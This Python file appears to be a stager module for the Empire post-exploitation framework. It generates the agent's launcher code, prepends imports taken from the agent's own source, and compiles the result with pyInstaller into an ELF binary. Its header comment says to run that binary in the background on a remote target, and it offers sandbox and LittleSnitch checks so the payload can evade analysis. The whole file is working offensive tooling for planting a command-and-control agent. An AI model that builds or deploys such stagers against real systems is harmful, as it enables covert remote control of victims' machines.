from lib.common import helpers
import os

"""

Install steps...

- install pyInstaller
-- try: 


- copy into stagers directory
-- ./Empire/lib/stagers/

- kick off the empire agent on a remote target
-- /tmp/empire &

@TweekFawkes

"""

class Stager:

	def __init__(self, mainMenu, params=[]):

		self.info = {
			'Name': 'pyInstaller Launcher',

			'Author': ['@TweekFawkes'],

			'Description': ('Generates an ELF binary payload launcher for Empire using pyInstaller.'),

			'Comments': [
				'Needs to have pyInstaller setup on the system you are creating the stager on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller'
			]
		}

		# any options needed by the stager, settable during runtime
		self.options = {
			# format:
			#   value_name : {description, required, default_value}
			'Listener' : {
				'Description'   :   'Listener to generate stager for.',
				'Required'      :   True,
				'Value'         :   ''
			},
			'Language' : {
				'Description'   :   'Language of the stager to generate.',
				'Required'      :   True,
				'Value'         :   'python'
			},
			'BinaryFile' : {
				'Description'   :   'File to output launcher to.',
				'Required'      :   True,
				'Value'         :   '/tmp/empire'
			},
			'SafeChecks' : {
				'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
				'Required'      :   True,
				'Value'         :   'True'
			},
			'Base64' : {
				'Description'   :   'Switch. Base64 encode the output. Defaults to False.',
				'Required'      :   True,
				'Value'         :   'False'
			},            
			'UserAgent' : {
				'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
				'Required'      :   False,
				'Value'         :   'default'
			}
		}

		# save off a copy of the mainMenu object to access external functionality
		#   like listeners/agent handlers/etc.
		self.mainMenu = mainMenu

		for param in params:
			# parameter format is [Name, Value]
			option, value = param
			if option in self.options:
				self.options[option]['Value'] = value

	def generate(self):

		# extract all of our options
		language = self.options['Language']['Value']
		listenerName = self.options['Listener']['Value']
		base64 = self.options['Base64']['Value']
		userAgent = self.options['UserAgent']['Value']
		safeChecks = self.options['SafeChecks']['Value']
		BinaryFile_Str = self.options['BinaryFile']['Value']

		encode = False
		if base64.lower() == "true":
			encode = True

		import subprocess
		output_Str = subprocess.check_output(['which', 'pyinstaller'])
		if output_Str == "":
			print helpers.color("[!] Error pyInstaller is not installed")
			print helpers.color("[!] Try: apt-get -y install python-pip && pip install pyinstaller")
			return ""
		else:
			# generate the launcher code
			launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, safeChecks=safeChecks)
			if launcher == "":
				print helpers.color("[!] Error in launcher command generation.")
				return ""
			else:
				filesToExtractImportsFrom_List = []

				# pull the database connection object out of the main menu
				self.conn = self.mainMenu.conn
				# pull out the code install path from the database config
				cur = self.conn.cursor()
				
				cur.close()
				
				
				stagerFFP_Str = self.mainMenu.installPath + "/data/agent/stagers/http.py"
				stagerFFP_Str = os.path.join(self.mainMenu.installPath, "data/agent/stagers/http.py")

				filesToExtractImportsFrom_List.append(stagerFFP_Str)
				
				agentFFP_Str = self.mainMenu.installPath + "/data/agent/agent.py"
				filesToExtractImportsFrom_List.append(agentFFP_Str)
				
				imports_List = []
				for FullFilePath in filesToExtractImportsFrom_List:
					with open(FullFilePath, 'r') as file:
						for line in file:
							line = line.strip()
							if line.startswith('import '):
								helpers.color(line)
								imports_List.append(line)
							elif line.startswith('from '):
								helpers.color(line)
								imports_List.append(line)

				imports_List.append('import trace')
				imports_List.append('import json')
				imports_List = list(set(imports_List)) # removing duplicate strings
				imports_Str = "\n".join(imports_List)
				launcher = imports_Str + "\n" + launcher

				with open(BinaryFile_Str + ".py", "w") as text_file:
					text_file.write("%s" % launcher)

				import time
				output_Str = subprocess.check_output(['pyinstaller', '-y', '--clean', '--specpath', os.path.dirname(BinaryFile_Str), '--distpath', os.path.dirname(BinaryFile_Str), '--workpath', '/tmp/'+str(time.time())+'-build/', '--onefile', BinaryFile_Str + '.py'])
		return launcher
